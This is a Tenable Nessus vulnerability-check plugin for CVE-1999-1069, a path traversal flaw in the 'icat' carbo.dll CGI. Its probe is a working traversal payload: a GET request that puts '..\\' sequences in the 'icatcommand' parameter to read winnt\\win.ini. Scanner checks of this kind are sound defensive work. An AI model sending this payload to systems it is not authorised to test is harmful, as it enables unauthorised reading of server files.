#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10112);
 script_version ("$Revision: 1.29 $");

 script_cve_id("CVE-1999-1069");
 script_bugtraq_id(2126);
 script_xref(name:"OSVDB", value:"93");

 script_name(english:"icat carbo.dll icatcommand Parameter Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is hosting a CGI application that is affected by
an information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The installed version of the 'icat' CGI allows a remote user to read
arbitrary files on the remote target, because it fails to properly
sanitize user supplied input to the 'icatcommand' parameter." );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
 script_end_attributes();
 
 script_summary(english:"Determines the presence of the 'icat' cgi");
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http.inc");
include("misc_func.inc");
include("global_settings.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
  res = http_send_recv3(method:"GET", item:string(dir, "/carbo.dll?icatcommand=..\\..\\..\\..\\..\\..\\winnt\\win.ini&catalogname=catalog"), port:port);
  if (isnull(res)) exit(1, "The remote web server did not respond to the GET request.");

  if ("[fonts]" >< res[2])
    security_warning(port:port);
}
